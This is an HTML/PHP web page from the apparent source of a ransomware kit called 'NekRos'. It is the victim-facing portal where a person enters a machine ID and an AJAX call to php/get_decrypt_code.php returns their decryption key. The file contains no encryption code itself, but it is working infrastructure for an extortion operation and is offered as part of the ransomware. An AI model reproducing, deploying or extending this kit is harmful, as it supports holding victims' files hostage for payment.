<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
	<!--[if IE]>
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<![endif]-->
    <title>NekRos - Ransomeware</title>
	
	 <link rel="stylesheet" type="text/css" href="css/style.css">
	<script type="text/javascript" src="js/jquery-min.js"></script>
</head>
<body>
	<div class="container">
		<form id="contact">
			<a href="" title="NekRos - Ransomeware">
				<img id="logo" title="NekRos" src="img/logo.png" alt="NekRos" width="210px"/>
			</a>
			<h1 id="main-title">NekRos</h1>
			<fieldset>
				<h4 id="sub-title">Enter the key provided by NekRos.</h4>
				<input id="software_key" name="software_key" placeholder="Machine ID" type="text" required>
			</fieldset>
			<fieldset>
				<button id="submit" name="submit" type="submit">Request my decryption key</button>
			</fieldset>
			<fieldset>
				<h4 id="result-ko">No decryption key found.</h4>
				<h4 id="result-ok">Your decryption key :</h4>
				<h4 id="decrypt_key"></h4>
				<a id="link_return" href="" title="Return"><h4>Return</h4></a>
			</fieldset>
			<p class="copyright">Copyright &copy; <?php echo date("Y"); ?> <a title="Technowlogy" href="https://www.technowlogy.tk/" target="_blank">Technowlogy</a>  - NekRos. All rights reserved.</p>
		</form>
	</div>
	
	<script>
		$(document).ready(function(){
			$("#submit").click(function(event) {
				if ($("#software_key").val() != "") {
					event.preventDefault();
					$("#submit").attr("disabled", "true");
					
					// AJAX Code To Submit Form.
					var request = $.ajax({
						url: "php/get_decrypt_code.php",
						method: "POST",
						data: { software_key : $("#software_key").val() },
						dataType: "text",
					});
					request.done(function(data) {
						if (data == "Failed" ) {
							$("body").css("background", "#EF3125");
							$("#logo").attr("src", "img/logo.png");
							$("#main-title").css("color", "#EF3125");
							$("#software_key").hide();
							$("#submit").css("background", "#EF3125");
							$("#submit").attr("disabled", "false");
							$("#sub-title").hide();
							$("#submit").hide();
							$("#result-ko").show();
							$("#link_return").show();
						}
						else {
							$("body").css("background", "#43A047");
							$("#logo").attr("src", "img/logo-ok.png");
							$("#main-title").css("color", "#43A047");
							$("#submit").css("background", "#43A047");
							$('#submit').attr('disabled', "false");
							$("#sub-title").hide();
							$("#software_key").hide();
							$("#submit").hide();
							$("#result-ok").show();
							$("#decrypt_key").text(data);
							$("#decrypt_key").show();
							$("#link_return").show();
						}
					})
					request.fail(function(jqXHR, textStatus) {
						console.log("Erreur : " + textStatus);
						$("#submit").attr("disabled", "false");
					});
				}
			});
		});
	</script>
</body>
</html>
